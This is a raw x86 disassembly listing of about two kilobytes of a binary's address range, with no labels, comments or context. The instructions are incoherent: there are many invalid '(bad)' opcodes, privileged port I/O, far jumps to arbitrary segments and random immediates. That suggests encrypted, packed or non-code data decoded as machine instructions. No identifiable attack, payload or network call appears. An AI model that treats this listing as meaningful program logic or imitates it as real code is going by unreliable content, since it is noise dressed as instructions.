  402af6:	sbb    DWORD PTR [edx],0xffffffa6
  402af9:	pop    ecx
  402afa:	mov    esi,0xca0a1e0
  402aff:	mov    ecx,0x388c75a6
  402b04:	and    BYTE PTR [ebx],0x22
  402b07:	lock jno 0x402b45
  402b0a:	mov    ecx,0x5071389e
  402b0f:	addr16 test al,0xd9
  402b12:	cwde   
  402b13:	daa    
  402b14:	cdq    
  402b15:	sub    BYTE PTR [ebx],dh
  402b17:	push   ecx
  402b18:	add    eax,DWORD PTR es:[ecx]
  402b1b:	pop    eax
  402b1c:	popa   
  402b1d:	repnz cld 
  402b1f:	lds    edx,FWORD PTR [esi+0x1e]
  402b22:	pop    ds
  402b23:	sbb    eax,DWORD PTR [ebx]
  402b25:	jns    0x402ba0
  402b27:	mov    dh,0x67
  402b29:	lahf   
  402b2a:	pop    ss
  402b2b:	inc    esp
  402b2c:	fst    QWORD PTR [esi-0x683539f0]
  402b32:	sbb    edi,DWORD PTR [ebx]
  402b34:	and    ecx,DWORD PTR [ebx]
  402b36:	sti    
  402b37:	adc    edi,DWORD PTR ds:0x86944b09
  402b3d:	cmc    
  402b3e:	pop    ebp
  402b3f:	jecxz  0x402ac7
  402b41:	data16 mov dl,0x3b
  402b44:	fldcw  WORD PTR [edi+0x3dcd29e7]
  402b4a:	call   ebx
  402b4c:	xor    cl,dh
  402b4e:	jecxz  0x402b9e
  402b50:	adc    DWORD PTR [edi+0x6a8f3b6b],ecx
  402b56:	xchg   ebx,eax
  402b57:	dec    ebx
  402b58:	mul    BYTE PTR [edi-0x23]
  402b5b:	jns    0x402b12
  402b5d:	mov    cl,0x90
  402b5f:	sbb    eax,DWORD PTR [ebx+0x716bc520]
  402b65:	cwde   
  402b66:	inc    edi
  402b67:	pushf  
  402b68:	data16 je 0x402be9
  402b6b:	xlat   BYTE PTR ds:[ebx]
  402b6c:	stos   BYTE PTR es:[edi],al
  402b6d:	push   esi
  402b6e:	push   ecx
  402b6f:	mov    ah,0xc4
  402b71:	adc    al,0x25
  402b73:	fsub   DWORD PTR [esi-0x43]
  402b76:	(bad)  
  402b77:	xor    dh,BYTE PTR [ebp+0x7db84d1]
  402b7d:	jo     0x402b47
  402b7f:	xor    eax,0x9bfab7ec
  402b84:	lods   al,BYTE PTR ds:[esi]
  402b85:	sub    al,0xa5
  402b87:	jle    0x402b78
  402b89:	jb     0x402bf4
  402b8b:	daa    
  402b8c:	nop
  402b8d:	icebp  
  402b8e:	rcr    BYTE PTR [esi-0x23e53e52],cl
  402b94:	aaa    
  402b95:	and    BYTE PTR [ecx+0x0],0x94
  402b99:	xor    eax,0x95f7103d
  402b9e:	push   ebp
  402b9f:	push   ecx
  402ba0:	sub    DWORD PTR [ecx],0x76593c2e
  402ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ba7:	xor    al,0xfd
  402ba9:	inc    esp
  402baa:	shl    bh,1
  402bac:	mov    ds:0xbb72a7fc,eax
  402bb1:	rol    BYTE PTR [edi],1
  402bb3:	jg     0x402c02
  402bb5:	lock dec ebx
  402bb7:	jle    0x402bb7
  402bb9:	adc    ch,BYTE PTR [ebp+0x3b0d5e09]
  402bbf:	into   
  402bc0:	or     eax,0x9f65459c
  402bc5:	push   ds
  402bc6:	out    0x5d,eax
  402bc8:	pop    ebx
  402bc9:	ins    DWORD PTR es:[edi],dx
  402bca:	pop    esi
  402bcb:	dec    edx
  402bcc:	in     al,dx
  402bcd:	fld    DWORD PTR [ecx+0x61aba63a]
  402bd3:	push   ebp
  402bd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bd5:	jge    0x402bf0
  402bd7:	adc    ebx,DWORD PTR [edi-0x7e]
  402bda:	test   eax,0xfee8fa3c
  402bdf:	jmp    0xd5392d4e
  402be4:	ror    BYTE PTR [eax],0xcd
  402be7:	fmul   DWORD PTR [ebp+0x766195bf]
  402bed:	test   eax,0x3c8a0f66
  402bf2:	pushf  
  402bf3:	das    
  402bf4:	mov    ebp,0x6827371e
  402bf9:	adc    edi,DWORD PTR [esi+0x10f80fb8]
  402bff:	cmp    edi,ebp
  402c01:	sbb    eax,0xf257c380
  402c06:	cmp    BYTE PTR [ecx-0x7075ca8d],0x47
  402c0d:	std    
  402c0e:	fsub   QWORD PTR [eax+0x33]
  402c11:	jae    0x402c22
  402c13:	pop    eax
  402c14:	pop    esi
  402c15:	mov    al,ds:0x4867dea7
  402c1a:	clc    
  402c1b:	fnstsw WORD PTR [ebx*2+0x44f4b274]
  402c22:	aad    0x2c
  402c24:	dec    esi
  402c25:	outs   dx,DWORD PTR ds:[esi]
  402c26:	das    
  402c27:	jecxz  0x402c6e
  402c29:	xchg   edi,esi
  402c2b:	fdivp  st(6),st
  402c2d:	sbb    dl,BYTE PTR [edi]
  402c2f:	add    bh,BYTE PTR [ecx+0x14]
  402c32:	or     esp,DWORD PTR [edx+eiz*1-0x4de4f60]
  402c39:	pop    eax
  402c3a:	out    dx,eax
  402c3b:	push   ecx
  402c3c:	push   0x70
  402c3e:	lods   al,BYTE PTR ds:[esi]
  402c3f:	pop    ss
  402c40:	mov    ds:0x3d5d72ce,al
  402c45:	mov    DWORD PTR [ecx-0x6b],ecx
  402c48:	(bad)
  402c4c:	xor    BYTE PTR [ecx-0x68caff1],0x3a
  402c53:	push   es
  402c54:	(bad)  
  402c55:	js     0x402c6a
  402c57:	jno    0x402c02
  402c59:	push   esi
  402c5a:	add    BYTE PTR ds:0xd4c48167,0xfb
  402c61:	xor    eax,0xb898e9f3
  402c66:	idiv   DWORD PTR [edi+ebp*1-0x36]
  402c6a:	jno    0x402c88
  402c6c:	js     0x402c11
  402c6e:	sbb    al,0xf7
  402c70:	cmc    
  402c71:	push   eax
  402c72:	sbb    eax,0xaae896cc
  402c77:	int3   
  402c78:	iret   
  402c79:	repz lds esi,FWORD PTR [ebx+0x70]
  402c7d:	xlat   BYTE PTR ds:[ebx]
  402c7e:	lea    edi,ds:0x60662411
  402c84:	and    DWORD PTR [esi+0x2b],edi
  402c87:	arpl   di,cx
  402c89:	mov    cl,0xd9
  402c8b:	loopne 0x402c2d
  402c8d:	mov    ds:0x34899289,eax
  402c92:	out    0xab,al
  402c94:	jo     0x402cdc
  402c96:	xchg   BYTE PTR [edi],ch
  402c98:	call   0xc266:0x6a888394
  402c9f:	and    ch,BYTE PTR [esi+0x36a4ea3]
  402ca5:	scas   eax,DWORD PTR es:[edi]
  402ca6:	push   ds
  402ca7:	and    edx,eax
  402ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402caa:	ds pop edx
  402cac:	inc    ebp
  402cad:	int    0x32
  402caf:	or     BYTE PTR [eax],dl
  402cb1:	gs call 0x10e4:0x9b35b828
  402cb9:	sahf   
  402cba:	pop    eax
  402cbb:	ret    
  402cbc:	mov    al,0x89
  402cbe:	pop    edi
  402cbf:	dec    ebx
  402cc0:	mov    ds:0x3461957,eax
  402cc5:	mov    esi,DWORD PTR [edx]
  402cc7:	retf   
  402cc8:	imul   ah
  402cca:	cdq    
  402ccb:	inc    esp
  402ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ccd:	div    DWORD PTR [esp+ecx*8+0x453ab106]
  402cd4:	rol    BYTE PTR [eax+0x38aadab7],1
  402cda:	cmp    al,0x8c
  402cdc:	pop    ss
  402cdd:	test   edi,esp
  402cdf:	jge    0x402c64
  402ce1:	cli    
  402ce2:	popf   
  402ce3:	ds mov esi,0x303f5e08
  402ce9:	test   DWORD PTR [edx+0x6e5f0c14],0x32b23e03
  402cf3:	fwait
  402cf4:	adc    BYTE PTR [ecx-0x3f],bl
  402cf7:	in     eax,dx
  402cf8:	mov    esp,0x9c191abe
  402cfd:	ret    
  402cfe:	jle    0x402c94
  402d00:	lock mov eax,0x6e670a6b
  402d06:	stos   BYTE PTR es:[edi],al
  402d07:	xor    al,0x77
  402d09:	or     bl,al
  402d0b:	aad    0xe2
  402d0d:	loop   0x402cb7
  402d0f:	jl     0x402d33
  402d11:	inc    eax
  402d12:	mov    eax,0x3b1aa732
  402d17:	ins    BYTE PTR es:[edi],dx
  402d18:	stos   BYTE PTR es:[edi],al
  402d19:	jo     0x402d48
  402d1b:	dec    edx
  402d1c:	pop    eax
  402d1d:	sbb    DWORD PTR [ecx-0x61ee30dd],esi
  402d23:	sub    ebp,DWORD PTR [ecx+0x161f8e5]
  402d29:	dec    ecx
  402d2a:	js     0x402d8b
  402d2c:	jmp    0xf4f:0x36058967
  402d33:	popa   
  402d34:	mov    edx,0x9bb9908c
  402d39:	imul   ebx,DWORD PTR [eax+0x2f],0xffffffa9
  402d3d:	in     al,dx
  402d3e:	mov    eax,0x1ad57088
  402d43:	popa   
  402d44:	imul   si,WORD PTR [edx+ecx*4+0x43],0x3bbe
  402d4b:	les    ecx,FWORD PTR [edx+0x78]
  402d4e:	mov    ss,eax
  402d50:	rol    DWORD PTR [ebx+0x16270003],1
  402d56:	add    BYTE PTR [ebp-0x28f1bdbd],dl
  402d5c:	cdq    
  402d5d:	in     eax,0x4b
  402d5f:	(bad)  
  402d60:	pop    ebx
  402d61:	xor    eax,0x2b3e2e2
  402d66:	clc    
  402d67:	js     0x402cec
  402d69:	dec    edi
  402d6a:	call   0xb1e06a12
  402d6f:	(bad)  
  402d70:	out    0x4c,eax
  402d72:	sub    DWORD PTR [ebp+0x4e],0x51837c53
  402d79:	add    esp,0x90c22f91
  402d7f:	xor    BYTE PTR [eax+0x3a],ah
  402d82:	js     0x402d0b
  402d84:	sbb    ah,BYTE PTR [esi+0x6679208f]
  402d8a:	add    al,0x91
  402d8c:	inc    bp
  402d8e:	jge    0x402e02
  402d90:	mov    ds,ebp
  402d92:	or     cl,BYTE PTR [edi]
  402d94:	sub    ah,BYTE PTR [ecx]
  402d96:	out    0x9e,eax
  402d98:	dec    esi
  402d99:	mov    edi,0x5b4fa1bc
  402d9e:	retf   
  402d9f:	je     0x402d29
  402da1:	je     0x402d37
  402da3:	inc    eax
  402da4:	pop    edx
  402da5:	sub    al,0xa3
  402da7:	(bad)
  402daa:	pop    ebx
  402dab:	in     eax,0xe4
  402dad:	inc    ecx
  402dae:	and    BYTE PTR [edi-0x2c],bl
  402db1:	add    BYTE PTR [eax],dl
  402db3:	mov    al,0x9b
  402db5:	add    ebp,edx
  402db7:	mov    eax,0x6307a4ff
  402dbc:	icebp  
  402dbd:	ret    0xed94
  402dc0:	mov    cl,0x3d
  402dc2:	sub    ch,bh
  402dc4:	mov    WORD PTR [edi+ebp*4-0x4f1f4aed],?
  402dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dcc:	xchg   ebx,eax
  402dcd:	add    esp,eax
  402dcf:	not    BYTE PTR [esi+0x15]
  402dd2:	fwait
  402dd3:	and    BYTE PTR [ecx-0x27b74c43],0x23
  402dda:	push   ebp
  402ddb:	outs   dx,BYTE PTR ds:[esi]
  402ddc:	(bad)  
  402ddd:	adc    cl,BYTE PTR ss:[edi+0x28395dab]
  402de4:	rol    DWORD PTR [edx],1
  402de6:	repnz cs in eax,dx
  402de9:	es dec esi
  402deb:	push   eax
  402dec:	aam    0xb6
  402dee:	loopne 0x402de8
  402df0:	popf   
  402df1:	pop    eax
  402df2:	jae    0x402d92
  402df4:	add    DWORD PTR [ecx+0x2e8ed77c],edx
  402dfa:	jge    0x402d91
  402dfc:	inc    ebp
  402dfd:	sbb    BYTE PTR [eax+ebx*1+0x24],cl
  402e01:	out    0xf9,eax
  402e03:	mov    ebx,0xa57fc547
  402e08:	and    DWORD PTR [edi+edx*2+0x4b],esp
  402e0c:	xchg   esi,eax
  402e0d:	ss xor ecx,edx
  402e10:	xor    DWORD PTR [edx],eax
  402e12:	push   edi
  402e13:	add    DWORD PTR [ebp+0x69286708],0xffffffb0
  402e1a:	push   esi
  402e1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e1c:	cdq    
  402e1d:	jbe    0x402dec
  402e1f:	scas   eax,DWORD PTR es:[edi]
  402e20:	mov    cl,BYTE PTR [ecx]
  402e22:	push   es
  402e23:	sub    al,0x7e
  402e25:	repnz adc ebp,0x4a
  402e29:	call   0x9c30:0x852ab979
  402e30:	push   edi
  402e31:	cmp    BYTE PTR [eax-0x28],ch
  402e34:	cdq    
  402e35:	aas    
  402e36:	jl     0x402e79
  402e38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e39:	aad    0x3b
  402e3b:	cld    
  402e3c:	into   
  402e3d:	shl    BYTE PTR [ebx-0x43],1
  402e40:	pop    DWORD PTR [edx+0x34ad9bb8]
  402e46:	sbb    al,0x32
  402e48:	and    cl,BYTE PTR [ecx]
  402e4a:	xor    BYTE PTR [eax],ch
  402e4c:	adc    al,0x54
  402e4e:	mov    eax,ds:0xbc1e81a9
  402e53:	test   BYTE PTR [ecx-0x50],bl
  402e56:	pop    es
  402e57:	inc    esp
  402e58:	sub    ecx,DWORD PTR [eax-0x71c293e8]
  402e5e:	xlat   BYTE PTR ds:[ebx]
  402e5f:	and    al,0x79
  402e61:	ret    0xa126
  402e64:	out    0x4a,al
  402e66:	push   0x36
  402e68:	aad    0xcc
  402e6a:	or     ebp,eax
  402e6c:	push   eax
  402e6d:	or     DWORD PTR [esi],ebx
  402e6f:	outs   dx,BYTE PTR ds:[esi]
  402e70:	rol    dl,1
  402e72:	ret    
  402e73:	jmp    0x9df6740d
  402e78:	lahf   
  402e79:	push   ebp
  402e7a:	out    0xc0,al
  402e7c:	xchg   ecx,eax
  402e7d:	fs mov bh,0xf9
  402e80:	dec    esp
  402e81:	lock add al,BYTE PTR [edx-0x160af91]
  402e88:	mov    esp,0xe727a0b1
  402e8d:	fdivp  st(7),st
  402e8f:	mov    ds:0xfc475fbc,eax
  402e94:	ret    0x95ff
  402e97:	enter  0x1aa0,0xa2
  402e9b:	out    0xc2,eax
  402e9d:	dec    eax
  402e9e:	nop
  402e9f:	xor    BYTE PTR [ebx+0x7a9e9fe2],dh
  402ea5:	sub    BYTE PTR [ecx],ah
  402ea7:	rcr    BYTE PTR [ebx+ebp*4+0x26db585],1
  402eae:	adc    ebx,DWORD PTR [esi]
  402eb0:	shr    BYTE PTR [esi+0x2ac7037a],0xe
  402eb7:	sbb    DWORD PTR [esi-0x31],esp
  402eba:	mov    ebp,0x80a0dab
  402ebf:	xchg   edx,eax
  402ec0:	and    eax,DWORD PTR [ecx]
  402ec2:	jno    0x402ef8
  402ec4:	mov    dl,0x76
  402ec6:	mov    ds:0x19741213,eax
  402ecb:	shl    DWORD PTR [ebx+0x1a],1
  402ece:	cmp    eax,0x2e970df2
  402ed3:	sbb    cl,BYTE PTR [eax+0x1b]
  402ed6:	rcr    DWORD PTR [esi-0x7f],cl
  402ed9:	jnp    0x402e9b
  402edb:	add    eax,0x6a27b3d9
  402ee0:	mov    ebp,0x96b4a3d9
  402ee5:	(bad)  
  402ee7:	arpl   bp,di
  402ee9:	loopne 0x402ef2
  402eeb:	int    0x4e
  402eed:	jne    0x402f3e
  402eef:	mov    ch,0x6f
  402ef1:	hlt    
  402ef2:	sbb    al,0x54
  402ef4:	retf   0x2f08
  402ef7:	ins    BYTE PTR es:[edi],dx
  402ef8:	adc    edx,edi
  402efa:	stos   BYTE PTR es:[edi],al
  402efb:	ins    DWORD PTR es:[edi],dx
  402efc:	and    DWORD PTR [ecx],eax
  402efe:	mov    eax,0x484d694
  402f03:	add    BYTE PTR [ebx+0x45450aac],dl
  402f09:	sbb    al,0xe7
  402f0b:	sub    BYTE PTR [edx-0x5b6b5c5b],dh
  402f11:	adc    BYTE PTR [eax+0x16],0xf5
  402f15:	cmp    al,0x2
  402f17:	das    
  402f18:	xor    DWORD PTR [edx],esi
  402f1a:	adc    al,0xd3
  402f1c:	xor    eax,DWORD PTR [edx+0x53]
  402f1f:	pusha  
  402f20:	add    edx,DWORD PTR [edx+edi*2]
  402f23:	shl    BYTE PTR [eax],0x97
  402f26:	test   DWORD PTR [ecx+0x15],edi
  402f29:	cli    
  402f2a:	out    0x2,eax
  402f2c:	aas    
  402f2d:	mov    BYTE PTR [ecx],0xe4
  402f30:	and    al,0x3c
  402f32:	jecxz  0x402f87
  402f34:	add    edi,DWORD PTR [esi-0x2c9080e2]
  402f3a:	mov    DWORD PTR [esi],esi
  402f3c:	in     al,0x2e
  402f3e:	mov    ds:0xb7528ef4,eax
  402f43:	sti    
  402f44:	push   0xfffffff0
  402f46:	add    ecx,DWORD PTR [esi-0x1a]
  402f49:	fsubr  DWORD PTR [edi-0x6715d9c4]
  402f4f:	out    dx,al
  402f50:	pop    ecx
  402f52:	inc    ecx
  402f53:	xchg   ebp,eax
  402f54:	mov    DWORD PTR [edi-0x45],ecx
  402f57:	ror    BYTE PTR [edi],1
  402f59:	ret    
  402f5a:	push   es
  402f5b:	ds and al,0x3b
  402f5e:	dec    ecx
  402f5f:	repnz popf 
  402f61:	mov    BYTE PTR [ebx+0xd],0xc9
  402f65:	out    0x13,eax
  402f67:	jl     0x402fe5
  402f69:	adc    eax,0x40e6caef
  402f6e:	pusha  
  402f6f:	clc    
  402f70:	or     edx,DWORD PTR [ebx+esi*8]
  402f73:	arpl   bp,dx
  402f75:	cwde   
  402f76:	std    
  402f77:	xchg   edi,eax
  402f78:	ja     0x402fb1
  402f7a:	int    0x9
  402f7c:	mov    al,0xaf
  402f7e:	and    BYTE PTR [ebx+0x5],bh
  402f81:	imul   edi,DWORD PTR [eax],0x19
  402f84:	mov    eax,ds:0xcf688826
  402f89:	pop    ds
  402f8a:	mov    edx,0xca1a59ae
  402f8f:	out    dx,al
  402f90:	mov    ds:0xbf8817e,al
  402f95:	(bad)  
  402f96:	push   ebp
  402f97:	push   edi
  402f98:	and    dl,dh
  402f9a:	mov    cl,0x4c
  402f9c:	inc    esp
  402f9d:	xor    BYTE PTR [ecx+ebx*1+0x71827e00],bl
  402fa4:	xlat   BYTE PTR ds:[ebx]
  402fa5:	fs inc esi
  402fa7:	inc    edx
  402fa8:	pop    ds
  402fa9:	je     0x402fa9
  402fab:	sub    BYTE PTR [edi],al
  402fad:	pop    ebx
  402fae:	cs adc al,0xb8
  402fb1:	(bad)  
  402fb2:	push   DWORD PTR [edi+0x1e]
  402fb5:	cld    
  402fb6:	(bad)  
  402fb7:	cmp    al,0xcd
  402fb9:	xor    ah,BYTE PTR [edi-0xfbe80b8]
  402fbf:	cmp    eax,0xe418b261
  402fc4:	xor    ah,BYTE PTR [ecx+eiz*8+0x1f]
  402fc8:	mov    edx,0x1f0eb9a
  402fcd:	test   eax,0xe713d90a
  402fd2:	aaa    
  402fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fd4:	adc    eax,0x166c7bdd
  402fd9:	inc    esi
  402fda:	fwait
  402fdb:	xor    eax,0x8975a99e
  402fe0:	and    al,BYTE PTR [edx+0x5d]
  402fe3:	or     dh,dh
  402fe5:	fst    QWORD PTR [esi+0x8]
  402fe8:	add    eax,0xc8f0e304
  402fed:	test   al,0x3c
  402fef:	adc    al,0x29
  402ff1:	push   esp
  402ff2:	xor    bl,al
  402ff4:	xchg   edi,eax
  402ff5:	and    BYTE PTR [esi],cl
  402ff7:	add    dh,dl
  402ff9:	les    esi,FWORD PTR [edi+ecx*1+0x7f]
  402ffd:	push   ss
  402ffe:	mov    WORD PTR [ebx+0xc],cs
  403001:	shr    DWORD PTR [eax-0x7bdd25dc],cl
  403007:	mov    ebp,0xdfcd12cd
  40300c:	mov    ebx,0xdbbb4751
  403011:	arpl   WORD PTR [bx+si-0x60de],di
  403016:	in     eax,dx
  403017:	add    ah,BYTE PTR [ebx+0x5a5fb6f7]
  40301d:	jb     0x402ff5
  40301f:	retf   0xa050
  403022:	retf   
  403023:	push   ebx
  403024:	cmp    al,0xcb
  403026:	dec    esi
  403027:	pushf  
  403028:	arpl   WORD PTR ds:0x680d2613,ax
  40302e:	loope  0x402ff1
  403030:	or     al,BYTE PTR [ebx+0x5c]
  403033:	(bad)  
  403034:	xor    edx,DWORD PTR [ebp-0x6972931d]
  40303a:	rcl    BYTE PTR [ebx],1
  40303c:	cmp    bl,BYTE PTR [eax-0x79]
  40303f:	fs push edx
  403041:	icebp  
  403042:	pop    eax
  403043:	in     al,0xf1
  403045:	inc    DWORD PTR [ecx-0x2e2cf17e]
  40304b:	outs   dx,BYTE PTR ds:[esi]
  40304c:	pop    ebx
  40304d:	inc    eax
  40304e:	out    dx,eax
  40304f:	out    0x2f,al
  403051:	outs   dx,DWORD PTR ds:[esi]
  403052:	in     al,dx
  403053:	push   ecx
  403054:	loop   0x4030c9
  403056:	adc    edi,esi
  403058:	or     BYTE PTR [ebx+0x78],bl
  40305b:	call   0x6b03:0x21242691
  403062:	imul   esi,DWORD PTR [ecx-0x43],0xf0f08940
  403069:	fs retf 0xaff8
  40306d:	adc    DWORD PTR [ebx+0x6fa96359],ecx
  403073:	adc    edi,eax
  403075:	xor    BYTE PTR [eax+0x1b],cl
  403078:	and    ch,dl
  40307a:	pop    ecx
  40307b:	mov    dl,0xdf
  40307d:	sub    eax,edx
  40307f:	jmp    0xaddf:0xc9d3d433
  403086:	jmp    0x431fe3e6
  40308b:	sub    al,0x45
  40308d:	or     dl,BYTE PTR [ebx-0xa]
  403090:	test   bh,dh
  403092:	rol    dh,cl
  403094:	pop    DWORD PTR [edi+0x7d]
  403097:	mov    eax,ds:0x4a491a16
  40309c:	mov    al,BYTE PTR [esp+edi*1-0x2]
  4030a0:	gs cmp al,0x26
  4030a3:	sar    DWORD PTR [edx-0x2a],cl
  4030a6:	xlat   BYTE PTR ds:[ebx]
  4030a7:	sub    cl,bh
  4030a9:	push   ebp
  4030aa:	mov    ebx,0x5a2b430a
  4030af:	xor    DWORD PTR [eax+0xf20581c],eax
  4030b5:	sbb    dl,BYTE PTR [esi-0x51e571eb]
  4030bb:	call   0x9f5b983d
  4030c0:	std    
  4030c1:	int3   
  4030c2:	fld    TBYTE PTR [edx]
  4030c4:	loopne 0x403122
  4030c6:	mov    esp,0xd6fed59c
  4030cb:	int    0xf6
  4030cd:	jns    0x403131
  4030cf:	fild   WORD PTR [eax+esi*8-0xc86f7c8]
  4030d6:	ja     0x4030b6
  4030d8:	push   eax
  4030d9:	or     edi,DWORD PTR [edi-0x14]
  4030dc:	push   edx
  4030dd:	stos   DWORD PTR es:[edi],eax
  4030de:	xchg   ebp,eax
  4030df:	pushf  
  4030e0:	pop    ebp
  4030e1:	sbb    edx,DWORD PTR [esi-0x44]
  4030e4:	mov    eax,ds:0xe9887351
  4030e9:	xchg   BYTE PTR [eax],bl
  4030eb:	cmp    esi,DWORD PTR [edx]
  4030ed:	jne    0x403092
  4030ef:	loop   0x40315e
  4030f1:	push   esp
  4030f2:	jge    0x40312e
  4030f4:	fist   DWORD PTR [edi-0x54]
  4030f7:	aaa    
  4030f8:	sbb    esi,DWORD PTR [edx+0x37]
  4030fb:	xchg   ebp,eax
  4030fc:	add    al,0xa6
  4030fe:	jle    0x403087
  403100:	mov    eax,DWORD PTR ds:0xd7995b13
  403106:	pop    eax
  403107:	adc    BYTE PTR [edi],bl
  403109:	pop    esi
  40310a:	mov    ds:0x337b4b65,al
  40310f:	inc    esi
  403110:	mov    ch,0x86
  403112:	xlat   BYTE PTR ds:[ebx]
  403113:	xor    eax,0x8ab7097e
  403118:	adc    BYTE PTR [edx],ah
  40311a:	add    cl,BYTE PTR [ebp+0x6]
  40311d:	frstor [ecx]
  40311f:	mov    ecx,0x1194dc2a
  403124:	fs out 0xea,al
  403127:	or     DWORD PTR [ebp-0x60],0xffffffe5
  40312b:	int    0x24
  40312d:	hlt    
  40312e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40312f:	dec    edi
  403130:	adc    bl,BYTE PTR [edi+eiz*1+0x3f]
  403134:	aam    0x68
  403136:	mov    BYTE PTR [ecx+0x55],dl
  403139:	mov    dl,0xc5
  40313b:	loop   0x403199
  40313d:	add    bh,BYTE PTR [edx+eax*2-0x19fdb128]
  403144:	dec    eax
  403145:	mov    edx,ebp
  403147:	stos   DWORD PTR es:[edi],eax
  403148:	lds    edx,FWORD PTR [edx]
  40314a:	test   eax,0xda7ef42a
  40314f:	mov    cs,WORD PTR ds:0x14182383
  403155:	inc    DWORD PTR [edi+0x6]
  403158:	retf   
  403159:	inc    ecx
  40315a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40315b:	mov    esp,0xeeafea4c
  403160:	data16 loope 0x403198
  403163:	popf   
  403164:	ret    
  403165:	frstor [eax]
  403167:	sbb    esi,ebx
  403169:	mov    ch,bh
  40316b:	(bad)  ds:0xee51d004
  403171:	cwde   
  403172:	loop   0x403109
  403174:	sbb    esi,eax
  403176:	push   es
  403177:	ins    BYTE PTR es:[edi],dx
  403178:	retf   0x173b
  40317b:	mov    esi,0xf69fdfbc
  403180:	je     0x403190
  403182:	or     eax,0x8fc36dea
  403187:	xchg   esp,eax
  403188:	fcom   DWORD PTR [ecx-0x79]
  40318b:	mov    bh,0x4a
  40318d:	int    0xbb
  40318f:	mov    BYTE PTR [edi+0x7720494d],dl
  403195:	arpl   WORD PTR [edi-0x4],cx
  403198:	add    ch,BYTE PTR [ecx-0x4ae5bce8]
  40319e:	jmp    0x5da57f2
  4031a3:	pop    es
  4031a4:	jl     0x403149
  4031a6:	out    dx,al
  4031a7:	mov    edi,0xcf975e7c
  4031ac:	addr16 pop esp
  4031ae:	add    eax,0x77d5e7f
  4031b3:	mov    esi,0xaf707d94
  4031b8:	imul   ecx,DWORD PTR [esi+0x23e5cf11],0x6e
  4031bf:	ret    
  4031c0:	mov    bh,ch
  4031c2:	jnp    0x403163
  4031c4:	push   eax
  4031c5:	add    BYTE PTR [edx-0x50],0xb9
  4031c9:	and    DWORD PTR [edi-0x6d],ecx
  4031cc:	retf   
  4031cd:	and    BYTE PTR [esi],dh
  4031cf:	fidivr DWORD PTR [ebp-0x2a]
  4031d2:	add    al,0xa1
  4031d4:	mov    bl,0x92
  4031d6:	dec    ebp
  4031d7:	ja     0x4031c7
  4031d9:	pop    es
  4031da:	sbb    BYTE PTR ds:[ecx-0x78],ch
  4031de:	ds mov eax,0x2145aea3
  4031e4:	stos   BYTE PTR es:[di],al
  4031e6:	loope  0x403242
  4031e8:	test   eax,0x7ca279ba
  4031ed:	stos   BYTE PTR es:[edi],al
  4031ee:	ror    DWORD PTR [eax-0xbdb3432],0xff
  4031f5:	sub    dl,BYTE PTR [esi+eax*2]
  4031f8:	ret    
  4031f9:	or     eax,0x66714df7
  4031fe:	add    DWORD PTR [edx+0x5b],ebx
  403201:	sub    BYTE PTR [edx+ebp*1+0x3ee2d8a9],dh
  403208:	adc    al,0x2c
  40320b:	xor    al,0x36
  40320d:	daa    
  40320e:	xchg   edi,eax
  40320f:	sub    eax,0xff2d0cb8
  403214:	ds pop ebp
  403216:	repz or ecx,DWORD PTR [eax+0x52]
  40321a:	fnstenv [esi+0x68a8746e]
  403220:	or     BYTE PTR [ebx-0x6b0e7217],bh
  403226:	(bad)  
  403227:	retf   
  403228:	lods   al,BYTE PTR ds:[esi]
  403229:	(bad)  
  40322a:	leave  
  40322b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40322c:	add    edx,DWORD PTR [ebx+ebp*2+0x1e3e2bae]
  403233:	repnz mov edx,0xca58f6d9
  403239:	add    eax,ecx
  40323b:	test   al,0x3
  40323d:	rol    ebx,1
  40323f:	rcr    bl,0x38
  403242:	pop    ss
  403243:	rol    DWORD PTR [ebp-0x8],0x4
  403247:	into   
  403248:	sahf   
  403249:	(bad)  
  40324a:	mov    dl,0x19
  40324c:	push   0xb48f5d
  403251:	call   0x7832:0x4671d1b3
  403258:	xchg   ebx,eax
  403259:	sub    dl,BYTE PTR [edi-0x12c78307]
  40325f:	out    0x91,eax
  403261:	mov    eax,0x8b0df92c
  403266:	xchg   edi,eax
  403267:	xchg   ecx,eax
  403268:	in     al,0xd2
  40326a:	inc    eax
  40326b:	jo     0x4032ae
  40326d:	jmp    0x40327d
  40326f:	stos   DWORD PTR es:[edi],eax
  403270:	test   eax,0xb8d66ca
  403275:	das    
  403276:	cdq    
  403277:	mov    DWORD PTR [ebx],edx
  403279:	dec    esi
  40327a:	push   0x50051479
  40327f:	xchg   ecx,eax
  403280:	and    al,0xae
  403282:	lahf   
  403283:	dec    esp
  403284:	rcl    DWORD PTR [esi+0x62],1
  403287:	mov    ds:0x2e30d578,eax
  40328c:	fsubr  DWORD PTR [eax]
  40328e:	fistp  WORD PTR [ecx+0x6f83a6a6]
  403294:	jmp    0x798:0x4428510d
  40329b:	rol    BYTE PTR [ecx+0x6d],cl
  40329e:	lds    edi,FWORD PTR [ebp-0x350f742a]
  4032a4:	pusha  
  4032a5:	sub    eax,0xd242a66e
  4032aa:	jmp    0x829e:0xefb536be
  4032b1:	jns    0x4032b6
  4032b3:	add    al,BYTE PTR [eax-0x5c]
  4032b6:	out    dx,eax
  4032b7:	sub    al,0x15
  4032b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032ba:	sub    bh,BYTE PTR [esi+eax*8]
  4032bd:	not    BYTE PTR [edi]
  4032bf:	sbb    al,0xcd
  4032c1:	out    0xc5,eax
  4032c3:	xor    bh,al
  4032c5:	sub    ah,BYTE PTR [ecx-0x61]
  4032c8:	pop    ecx
  4032c9:	pop    esi
  4032ca:	outs   dx,DWORD PTR ds:[esi]
  4032cb:	and    al,0x9b
  4032cd:	xor    BYTE PTR [edi+0x5f],dh
  4032d0:	push   0x12d825e2
  4032d5:	sbb    esp,edx
  4032d7:	pop    ebx
  4032d8:	inc    edi
  4032d9:	sub    al,BYTE PTR [esi+ebp*2+0x6d]
  4032dd:	mov    dh,0x2f
